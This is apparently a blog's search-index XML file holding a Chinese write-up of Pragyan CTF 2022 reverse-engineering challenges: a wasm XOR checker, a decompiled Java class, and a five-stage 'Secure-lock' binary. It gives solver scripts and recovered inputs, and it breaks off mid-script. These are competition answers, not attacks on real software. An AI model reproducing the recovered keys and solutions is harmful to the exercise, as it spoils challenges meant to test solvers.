<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pragyan-ctf-2022</title>
      <link href="/2022/03/08/pragyan-ctf-2022/"/>
      <url>/2022/03/08/pragyan-ctf-2022/</url>
      
        <content type="html"><![CDATA[<p>玩一玩 <a id="more"></a></p><p>涉及到的题目链接：链接：<a href="https://pan.baidu.com/s/1ll1bWhd845tj6JDFkx3i6Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1ll1bWhd845tj6JDFkx3i6Q</a><br>提取码：fsrp</p><h3 id="Web-Awesome"><a href="#Web-Awesome" class="headerlink" title="Web Awesome"></a>Web Awesome</h3><p>打开网页，看到提交按钮的事件</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307223734453.png" alt="image-20220307223734453"></p><p>从源代码中定位到这个onclick</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307223841070.png" alt="image-20220307223841070"></p><p>这是一个考察wasm的题，将网站中的index.wasm下载下来，进行.wasm-&gt;.o的转换，ida中看到转化后的目标文件，运算只有一个异或9</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307224040013.png" alt="image-20220307224040013"></p><p>再看到init_memory中的数据，异或一下9即是flag</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307224232136.png" alt="image-20220307224232136"></p><h3 id="Oak"><a href="#Oak" class="headerlink" title="Oak"></a>Oak</h3><p>给的一个class文件，使用jar命令将这个class文件打包成一个jar包，然后用jd-gui查看jar包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf Oak.jar Oak.class</span><br></pre></td></tr></table></figure><p>jar包内容如下，剩下就是简单的java代码审计逆向。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Oak</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">long</span>[] data = &#123; <span class="number">28767L</span>, <span class="number">24418L</span>, <span class="number">25470L</span>, <span class="number">29771L</span>, <span class="number">26355L</span>, <span class="number">31349L</span>, <span class="number">13032L</span>, <span class="number">30456L</span>, <span class="number">14663L</span>, <span class="number">27592L</span>, <span class="number">8916L</span>, <span class="number">29409L</span>, <span class="number">7348L</span>, <span class="number">17474L</span>, <span class="number">5124L</span>, <span class="number">3345L</span>, <span class="number">49357L</span>, <span class="number">61058L</span>, <span class="number">65159L</span>, <span class="number">53773L</span>, <span class="number">67886L</span>, <span class="number">72426L</span>, <span class="number">103728L</span>, <span class="number">158125L</span>, <span class="number">179542L</span>, <span class="number">166504L</span>, <span class="number">212101L</span>, <span class="number">282674L</span>, <span class="number">320873L</span>, <span class="number">329272L</span>, <span class="number">400021L</span>, <span class="number">479881L</span>, <span class="number">535081L</span>, <span class="number">599886L</span>, <span class="number">662294L</span>, <span class="number">731441L</span>, <span class="number">831284L</span>, <span class="number">947032L</span>, <span class="number">1021482L</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">t_helper</span><span class="params">(<span class="keyword">int</span> paramInt, <span class="keyword">int</span>[] paramArrayOfInt)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (paramArrayOfInt[paramInt] != -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> paramArrayOfInt[paramInt];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramInt == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paramArrayOfInt[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> paramArrayOfInt[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramInt == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paramArrayOfInt[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> paramArrayOfInt[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramInt == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paramArrayOfInt[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">return</span> paramArrayOfInt[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    paramArrayOfInt[paramInt] = (<span class="number">3</span> * t_helper(paramInt - <span class="number">1</span>, paramArrayOfInt) - <span class="number">3</span> * t_helper(paramInt - <span class="number">2</span>, paramArrayOfInt) + t_helper(paramInt - <span class="number">3</span>, paramArrayOfInt));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> paramArrayOfInt[paramInt];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">t</span><span class="params">(<span class="keyword">int</span> paramInt)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] arrayOfInt = <span class="keyword">new</span> <span class="keyword">int</span>[paramInt + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arrayOfInt.length; i++) &#123;</span><br><span class="line">      arrayOfInt[i] = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t_helper(paramInt, arrayOfInt);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] paramArrayOfString)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (paramArrayOfString.length != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      System.out.println(<span class="string">"Usage: [flag]"</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (check(paramArrayOfString[<span class="number">0</span>])) &#123;</span><br><span class="line">      System.out.println(<span class="string">"Correct!"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">"Incorrect"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span>[] conv(String paramString)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">long</span>[] arrayOfLong = <span class="keyword">new</span> <span class="keyword">long</span>[paramString.length()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; paramString.length(); i++) &#123;</span><br><span class="line">      arrayOfLong[i] = ((paramString.charAt(i) &lt;&lt; <span class="string">'\b'</span>) + paramString.charAt((i + <span class="number">1</span>) % paramString.length()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arrayOfLong;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">long</span>[] arrayOfLong = conv(paramString);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arrayOfLong.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (data[i] != (arrayOfLong[i] ^ t(i * i))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Secure-lock"><a href="#Secure-lock" class="headerlink" title="Secure-lock"></a>Secure-lock</h3><p>开始就是五个逻辑很明显的check</p><p>1、check1</p><p>限定了这个数是45位，且给了这个数的后15位与前9位，而check_num2就是验证这个数是否是阿姆斯特朗数。<br><img src="/2022/03/08/pragyan-ctf-2022/image-20220307224439985.png" alt="image-20220307224439985"></p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307224445820.png" alt="image-20220307224445820"></p><p>因此这个checK就是让我们求一个45位，且限定了前9位与后15位的阿姆斯特朗数，我们爆破中间21位即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">check = <span class="keyword">lambda</span> N:sum(map(<span class="keyword">lambda</span> x: int(x)**len(str(N)), str(N))) == N</span><br><span class="line"></span><br><span class="line">x = <span class="string">'01'</span></span><br><span class="line">a = <span class="string">'110011001'</span></span><br><span class="line">c = <span class="string">'100011001011111'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">21</span>):</span><br><span class="line">    b = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">        b += x[(i &gt;&gt; j)&amp;<span class="number">1</span>]</span><br><span class="line">    ans = int(a+b+c, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> check(ans):</span><br><span class="line">        print(ans)</span><br></pre></td></tr></table></figure><p>2、check2</p><p>一个6字节伪随机数，与shuffle算法，这里要注意一下的就是通过输入8字节数据通过shuffle函数后要变为6字节与伪随机数相等。</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307225304002.png" alt="image-20220307225304002"></p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307225316911.png" alt="image-20220307225316911"></p><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7 = [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7[<span class="number">0</span>] = <span class="number">67</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7[<span class="number">1</span>] = <span class="number">131</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7[<span class="number">2</span>] = <span class="number">37</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7[<span class="number">3</span>] = <span class="number">59</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7[<span class="number">4</span>] = <span class="number">193</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7[<span class="number">5</span>] = <span class="number">71</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7[<span class="number">6</span>] = <span class="number">107</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7[<span class="number">7</span>] = <span class="number">233</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v7</span><br><span class="line">[<span class="number">67</span>, <span class="number">131</span>, <span class="number">37</span>, <span class="number">59</span>, <span class="number">193</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">233</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line"><span class="meta">... </span>    tmp = <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">if</span> i != j:</span><br><span class="line"><span class="meta">... </span>                    tmp ^= v7[j]</span><br><span class="line"><span class="meta">... </span>    ans.append(tmp)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line">[<span class="number">153</span>, <span class="number">89</span>, <span class="number">255</span>, <span class="number">225</span>, <span class="number">27</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">51</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc2 = <span class="number">0x0E08A6F2D5B19</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc2 = enc2.to_bytes(<span class="number">6</span>, <span class="string">'big'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc2</span><br><span class="line"><span class="string">b'\xe0\x8ao-[\x19'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">8</span>):</span><br><span class="line"><span class="meta">... </span>    ans[i] ^= enc2[i<span class="number">-2</span>]</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line">[<span class="number">153</span>, <span class="number">89</span>, <span class="number">31</span>, <span class="number">107</span>, <span class="number">116</span>, <span class="number">176</span>, <span class="number">234</span>, <span class="number">42</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = bytes(ans)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>int.from_bytes(ans, <span class="string">'little'</span>)</span><br><span class="line"><span class="number">3092478108203178393</span></span><br></pre></td></tr></table></figure><p>3、check3</p><p>一个base64</p><p>4、check4</p><p>多个方程：<br><img src="/2022/03/08/pragyan-ctf-2022/image-20220307225841720.png" alt="image-20220307225841720"></p><p>因为这个check的有一个条件 &amp;&amp; ，反过来就是 || 这样就导致了多解，这使得这个程序本地有多个可以反馈正确的输入。</p><p>z3解即可。</p><p>5、check5</p><p>就是一些异或和移位算法：</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307230148992.png" alt="image-20220307230148992"></p><p>解密：</p><p>先跑出get()函数返回的数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v7[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_num_1</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> a1 == <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">3L</span>L; a1 &gt;= i * i; i += <span class="number">2L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(a1 % i) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">-1L</span>L;</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( check_num_1(++v3) )</span><br><span class="line">      ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">v7[<span class="number">0</span>] = <span class="number">103</span>;</span><br><span class="line">v7[<span class="number">1</span>] = <span class="number">127</span>;</span><br><span class="line">v7[<span class="number">2</span>] = <span class="number">157</span>;</span><br><span class="line">v7[<span class="number">3</span>] = <span class="number">11</span>;</span><br><span class="line">v7[<span class="number">4</span>] = <span class="number">29</span>;</span><br><span class="line">v7[<span class="number">5</span>] = <span class="number">211</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#x, "</span>, <span class="built_in">get</span>(v7[i])&amp;<span class="number">0xff</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0x39, 0xcf, 0xa1, 0x25, 0x71, 0x15</span></span><br></pre></td></tr></table></figure><p>异或和移位解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = [<span class="number">0x39</span>, <span class="number">0xcf</span>, <span class="number">0xa1</span>, <span class="number">0x25</span>, <span class="number">0x71</span>, <span class="number">0x15</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc3 = <span class="number">0xA8F24130A1EFL</span>L</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc3 = enc3.to_bytes(<span class="number">6</span>, <span class="string">'little'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc3</span><br><span class="line"><span class="string">b'\xef\xa10A\xf2\xa8'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>int.from_bytes(enc3, <span class="string">'little'</span>)</span><br><span class="line"><span class="number">185758429258223</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc3 = list(enc3)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc3 = [<span class="number">16</span> * (i &amp; <span class="number">0xF</span>) + (i &gt;&gt; <span class="number">4</span>) <span class="keyword">for</span> i <span class="keyword">in</span> enc3]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc3</span><br><span class="line">[<span class="number">254</span>, <span class="number">26</span>, <span class="number">3</span>, <span class="number">20</span>, <span class="number">47</span>, <span class="number">138</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">254</span>)</span><br><span class="line"><span class="string">'0xfe'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">26</span>)</span><br><span class="line"><span class="string">'0x1a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = [enc3[i]^x[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line">[<span class="number">199</span>, <span class="number">213</span>, <span class="number">162</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">159</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = bytes(ans)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">b'\xc7\xd5\xa21^\x9f'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res3 = int.from_bytes(ans, <span class="string">'little'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res3</span><br><span class="line"><span class="number">175226908497351</span></span><br></pre></td></tr></table></figure><p>过了5个check后来看到最后的check_flag，就是将前5个check输入的数据作为key和flag进行一些异或运算</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220307231112324.png" alt="image-20220307231112324"></p><p>总结一下，得到前5个check的输入和最后的密文如下：<br><img src="/2022/03/08/pragyan-ctf-2022/image-20220307231152805.png" alt="image-20220307231152805"></p><p>解密：</p><p>以下涉及到一个python中将一个多元列表转化为一元列表的简单写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = [j <span class="keyword">for</span> i <span class="keyword">in</span> aa <span class="keyword">for</span> j <span class="keyword">in</span> i]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>v19[<span class="number">0</span>] = <span class="number">0xB688C7A7BE252CFB</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v19[<span class="number">1</span>] = <span class="number">0x3B31753308242432</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v19[<span class="number">2</span>] = <span class="number">0x23B66D9AC612B9D4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v19[<span class="number">3</span>] = <span class="number">0xC732FCCF85C78B27</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = [i.to_bytes(<span class="number">8</span>, <span class="string">'little'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> v19]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="string">b'\xfb,%\xbe\xa7\xc7\x88\xb6'</span>, <span class="string">b'2$$\x083u1;'</span>, <span class="string">b'\xd4\xb9\x12\xc6\x9am\xb6#'</span>, <span class="string">b"'\x8b\xc7\x85\xcf\xfc2\xc7"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = <span class="string">b''</span>.join(enc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line"><span class="string">b"\xfb,%\xbe\xa7\xc7\x88\xb62$$\x083u1;\xd4\xb9\x12\xc6\x9am\xb6#'\x8b\xc7\x85\xcf\xfc2\xc7"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = list(enc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="number">251</span>, <span class="number">44</span>, <span class="number">37</span>, <span class="number">190</span>, <span class="number">167</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">182</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">8</span>, <span class="number">51</span>, <span class="number">117</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">18</span>, <span class="number">198</span>, <span class="number">154</span>, <span class="number">109</span>, <span class="number">182</span>, <span class="number">35</span>, <span class="number">39</span>, <span class="number">139</span>, <span class="number">199</span>, <span class="number">133</span>, <span class="number">207</span>, <span class="number">252</span>, <span class="number">50</span>, <span class="number">199</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1 = <span class="number">28116440335967</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p2 = <span class="number">3092478108203178393</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p3 = <span class="string">'Mc5LyF7YvIxLxeTX'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p4 = <span class="string">'SIZHCAKC3LxftSDT'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p5 = <span class="number">175226908497351</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p3 = list(p3.encode())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p4 = list(p4.encode())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p3 = [<span class="number">16</span> * (i &amp; <span class="number">0xF</span>) + (i &gt;&gt; <span class="number">4</span>) <span class="keyword">for</span> i <span class="keyword">in</span> p3]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p4 = [<span 